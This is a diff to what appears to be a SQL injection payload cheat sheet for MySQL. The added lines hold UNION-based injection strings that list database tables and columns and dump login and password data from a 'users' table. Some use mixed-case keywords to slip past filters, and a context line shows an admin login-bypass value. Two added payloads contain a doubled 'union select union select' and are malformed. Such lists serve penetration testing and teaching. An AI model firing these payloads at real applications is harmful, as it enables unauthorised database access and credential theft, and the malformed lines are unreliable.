@@ -9,12 +9,18 @@
 ..............................................................................
 # MySQL
 
-    0+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
-    0+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
-    0+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
-    0+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
-    0+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()
-
+    ' union select login,password from users-- a
+    ' union all select 1,(select password from users),3+--+
+    '+UNION+SELECT+2,3,table_name,4+from+INFORMATION_SCHEMA.tables
+    '+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
+    '+UNION+SELECT+NULL,+COLUMN_NAME,+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
+    '+UNION+SELECT+NULL,+group_concat(COLUMN_NAME),+NULL,+NULL+FROM+INFORMATION_SCHEMA.COLUMNS
+    '+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()--
+    ' UNIon SELect 1,(SELect GROup_CONcat(COLumn_NAMe) FROm INFormation_SCHema.COLumns WHEre TABle_NAMe='users')-- -
+    ' UNIon SELect 1,(SELect GROup_CONcat(TABle_NAMe) FROm INFormation_SCHema.TABles WHEre TABle_SCHema=DATabase())-- -
+    1' union select union select GROUP_CONCAT(login SEPARATOR ', '), GROUP_CONCAT(password SEPARATOR ', ') FROM users# –– -
+    1' union select union select table_name, GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns where table_name = 'users'# –– -
+    
 ..............................................................................
  
     user=admin' ;&pass=a 
